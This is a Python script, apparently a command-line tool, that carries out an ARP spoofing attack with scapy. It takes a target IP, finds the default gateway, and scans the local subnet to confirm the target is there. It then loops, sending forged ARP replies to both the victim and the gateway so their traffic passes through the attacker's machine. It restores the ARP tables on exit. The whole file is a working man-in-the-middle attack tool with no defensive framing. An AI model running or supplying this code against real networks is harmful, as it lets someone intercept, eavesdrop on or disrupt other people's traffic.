#!/usr/bin/env python
import sys
import time
import scapy.all as scapy
import subprocess
import argparse
import re

def getArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="tgt", help="Target IP")
    args = parser.parse_args()
    if not args.tgt:
        print("\nMust specify a target.  Please type 'arpSpoof -h' for guidance on this utility.  Exiting program...\n")
        exit()
    else:
        return args
def getDefaultGateway():
    ipRoute = subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE)
    ipRouteResults = subprocess.check_output(["grep", "default"], stdin=ipRoute.stdout)
    gatewayList = re.search(r"\d+\.\d+\.\d+\.\d+", str(ipRouteResults))
    if gatewayList:
        gateway = gatewayList.group(0)
        return gateway
    else:
        print("Could not obtain default gateway.  Exiting program.")
        exit()
def getMAC(ip):
    arpReq = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpReqBroadcast = broadcast/arpReq
    answeredList = scapy.srp(arpReqBroadcast, timeout=1, verbose=False)[0]
    try:
        return answeredList[0][1].hwsrc
    except IndexError:
        print("\nTarget not found.  Retrying...")
def spoof(tgtIP, spoofIP):
    tgtMAC = getMAC(tgtIP)
    pkt = scapy.ARP(op=2, pdst=tgtIP, hwdst=tgtMAC, psrc=spoofIP)
    scapy.send(pkt, verbose=False)
def restore(destIP, srcIP):
    destMAC = getMAC(destIP)
    srcMAC = getMAC(srcIP)
    pkt = scapy.ARP(op=2, pdst=destIP, hwdst=destMAC, psrc=srcIP, hwsrc=srcMAC)
    scapy.send(pkt, count=10, verbose=False)
def inNetworkCheck(victim):
    ifconfigresult = subprocess.check_output(["ifconfig", "wlan0"])
    ipSearchResult = re.search(r"\d+\.\d+\.\d+\.\d+", str(ifconfigresult))
    if ipSearchResult:
        subnet = ipSearchResult.group(0)+"/24"
    else:
        print("\nCould not obtain host subnet.  Exiting program...\n")
        exit()
    arpReq = scapy.ARP(pdst=subnet)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpReqBroadcast = broadcast / arpReq
    answeredList = scapy.srp(arpReqBroadcast, timeout=1, verbose=False)[0]

    for element in answeredList:
        if victim == str(element[1].psrc):
            found = True
            break
        else:
            found = False
    if found:
        print("Requested IP found in network.  Conducting ARP spoof...\n")
    else:
        print(victim+" is an invalid target.  Please select from the following list:\n")
        for element in answeredList:
            print(element[1].psrc)
        print("\nExiting program...")
        exit()

opts = getArgs()
victim = opts.tgt
inNetworkCheck(victim)
defaultGateway = getDefaultGateway()
try:
    sentPktsCount = 0
    while True:
        spoof(victim, defaultGateway)
        spoof(defaultGateway, victim)
        sentPktsCount += 2
        print("\r[+] Packets sent: "+ str(sentPktsCount)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Ctrl+C Detected.  Resetting ARP tables and exiting program...")
    restore(victim, defaultGateway)
    restore(defaultGateway, victim)